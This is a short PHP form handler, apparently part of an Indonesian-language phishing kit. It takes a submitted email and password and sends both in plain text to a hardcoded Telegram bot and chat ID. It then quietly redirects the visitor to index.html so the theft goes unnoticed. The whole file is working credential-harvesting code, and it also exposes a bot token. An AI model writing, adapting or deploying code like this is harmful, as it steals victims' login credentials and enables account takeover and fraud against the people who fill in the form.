<?php
$token = "7783606251:AAHfso5w1XcaUwJYE_VnHSd2hl8x8S4AqAU"; 
$chat_id = "7711427708"; 

$email = $_POST['email'];
$password = $_POST['password'];

$message = "📌 *Pendaftaran Baru!*\n\n".
           "📧 Email: `$email`\n".
           "🔒 Password: `$password`\n".
           "🕒 Waktu: ".date("Y-m-d H:i:s");

$message = urlencode($message);
$url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$message&parse_mode=Markdown";
file_get_contents($url);

// Kembali ke halaman utama setelah data dikirim
header("Location: index.html");
exit();
?>
